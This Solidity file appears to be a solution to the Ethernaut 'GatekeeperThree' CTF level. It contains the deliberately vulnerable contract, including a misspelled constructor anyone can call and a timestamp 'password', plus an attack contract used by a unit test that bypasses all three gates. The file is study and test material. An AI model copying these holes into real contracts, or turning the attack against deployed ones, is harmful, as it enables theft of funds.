// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_enterance = false;
  SimpleTrick public trick;

  // note spelling error here, hence our attack
  // contract can call this function directly, since
  // it is not a true constructor
  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allow_enterance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allow_enterance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree returns (bool entered) {
    entrant = tx.origin;
    return true;
  }

  receive () external payable {}
}

// solution used by unit test
contract GatekeeperThreeAttack {
   GatekeeperThree vulnContract;

  constructor(address payable _vulnContract) {
    vulnContract = GatekeeperThree(_vulnContract);
  }

  function attack() external {
    // become owner, bypass gateOne
    vulnContract.construct0r();

    // set allow_enterance = true, bypass gateTwo
    vulnContract.createTrick();
    vulnContract.getAllowance(block.timestamp);

    // bypass gateThree
    payable(address(vulnContract)).transfer(0.002 ether);

    assert(vulnContract.enter());
  }

   receive() external payable {
    // need this to fail when being sent 0.001 in order
    // to bypass gateThree
    if( msg.value == 0.001 ether ) {
      revert("no thanks");
    }
   }
}